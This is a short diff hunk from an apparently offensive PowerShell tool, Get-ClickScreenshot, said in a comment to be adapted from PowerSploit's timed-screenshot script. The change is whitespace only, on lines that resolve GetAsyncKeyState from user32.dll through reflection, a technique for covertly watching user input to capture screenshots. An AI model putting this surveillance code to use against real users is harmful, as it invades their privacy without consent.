@@ -107,8 +107,8 @@ PS C:\> Get-ClickScreenshot -Path c:\temp\ -EndTime 14:00
     }
     # GetAsyncKeyState
     $GetAsyncKeyStateAddr = Get-ProcAddress user32.dll GetAsyncKeyState
-	$GetAsyncKeyStateDelegate = Get-DelegateType @([Windows.Forms.Keys]) ([Int16])
-	$GetAsyncKeyState = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetAsyncKeyStateAddr, $GetAsyncKeyStateDelegate)
+    $GetAsyncKeyStateDelegate = Get-DelegateType @([Windows.Forms.Keys]) ([Int16])
+    $GetAsyncKeyState = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetAsyncKeyStateAddr, $GetAsyncKeyStateDelegate)
 
     #modified from PowerSploit Get-TimedScreenshot.ps1 
     #improved to capture all screens instead of just the main screen
